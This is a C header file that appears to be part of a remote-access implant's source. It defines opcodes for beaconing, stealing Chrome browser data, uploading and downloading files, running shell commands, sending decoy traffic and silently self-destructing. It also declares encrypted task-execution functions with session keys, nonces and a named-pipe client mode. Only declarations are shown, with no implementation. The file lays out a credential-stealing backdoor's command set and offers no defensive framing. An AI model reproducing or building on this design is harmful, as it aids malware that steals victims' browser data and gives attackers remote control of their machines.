#pragma once

#include <pb_common.h>
#include <pb_encode.h>
#include <pb_decode.h>
#include "message.pb.h"
#include <sodium.h>

#include "laikabox.h"
#include "strings_main.h"

#include "debug.h"
#include "internet.h"
#include "pipe_server_client.h"
#include "chrome_stealer.h"
#include "helpers.h"

#define IDLE            0           // Do nothing
#define ADJUST_BEACON   1           // Gather information
#define SMOKESCREEN     2           // Sends some random Data to random Places
#define TAUNT           3           // Execute CALC
#define HOWLER          4           // Execute MessageBox.. With number of times

#define INFOGATHER      5           // Gather information
#define CHROME          6           // steal the chrome data

#define DOWNLOAD        7           // Download a file from server
#define UPLOAD          8           // Upload a file to server
#define SHELLCMD        9           // Execute shell command
#define DISSOLVE        10          // Siliently Destroy itself


#define REQUSET_BUFSIZE 1024 * 1024 * 4
#define REPLY_BUFSIZE   1024 * 1024 * 4

DWORD execTask(DWORD opcode, char* msg_args, LPBYTE pchRequest, LPBYTE pchReply,
               uint8_t* suburl_bin, uint8_t* client_guid_ephemeral, uint8_t* key_kdf_guid, 
               uint8_t* nonce_send, uint8_t* session_key_send, uint8_t* key_kdf_send,
               uint8_t* nonce_rcv, uint8_t* session_key_rcv, uint8_t* key_kdf_rcv,
               char* client_guid_real_b64, DWORD* beacon_Interval);

DWORD execTask_clientMode(DWORD opcode, char* msg_args, LPBYTE pchRequest, char* pipeFullPath,
               uint8_t* suburl_bin, uint8_t* client_guid_ephemeral, uint8_t* key_kdf_guid, 
               uint8_t* nonce_send, uint8_t* session_key_send, uint8_t* key_kdf_send,
               uint8_t* nonce_rcv, uint8_t* session_key_rcv, uint8_t* key_kdf_rcv,
               char* client_guid_real_b64, DWORD* beacon_Interval);